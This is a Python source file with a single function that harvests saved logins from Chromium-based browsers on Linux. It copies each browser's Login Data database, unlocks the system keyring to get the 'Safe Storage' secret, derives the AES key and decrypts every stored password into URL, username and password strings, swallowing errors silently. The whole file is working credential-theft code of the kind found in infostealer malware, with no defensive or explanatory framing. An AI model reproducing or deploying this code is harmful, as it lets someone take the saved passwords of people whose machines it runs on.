import os, sqlite3, shutil
import secretstorage
from hashlib import pbkdf2_hmac
from Crypto.Cipher import AES

def extract_browser_passwords(browser):
    browser = browser.lower()

    BROWSER_PATHS = {
        "chromium": "~/.config/chromium",
        "chrome": "~/.config/google-chrome",
        "edge": "~/.config/microsoft-edge",
        "brave": "~/.config/BraveSoftware/Brave-Browser",
        "opera": "~/.config/opera",
    }

    try:
        BASE = os.path.expanduser(BROWSER_PATHS[browser])
        LOGIN_DB = f"{BASE}/Default/Login Data"
        TMP_DB = "/tmp/chromium_login.db"
        shutil.copy2(LOGIN_DB, TMP_DB)
    except Exception:
        return []   # browser/profile not present

    # ---- get secret from libsecret ----
    try:
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        collection.unlock()

        secret = None
        for item in collection.get_all_items():
            label = item.get_label()
            if "Safe Storage" in label:
                secret = item.get_secret()
                break
        if not secret:
            return []
    except Exception:
        return []

    # ---- derive AES-128-CBC key ----
    key = pbkdf2_hmac("sha1", secret, b"saltysalt", 1, 16)

    def decrypt_pw(enc):
        if enc[:3] in (b"v10", b"v11"):
            enc = enc[3:]
        iv = b" " * 16
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(enc)
        pad_len = decrypted[-1]
        return decrypted[:-pad_len].decode(errors="ignore")

    creds = []
    try:
        db = sqlite3.connect(TMP_DB)
        cur = db.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, enc in cur.fetchall():
            if not enc:
                continue
            if isinstance(enc, memoryview):
                enc = enc.tobytes()
            try:
                pwd = decrypt_pw(enc)
            except:
                pwd = "<decrypt failed>"
            creds.append(url+" | "+user+" | "+pwd)
        db.close()
    except Exception:
        return []

    return creds
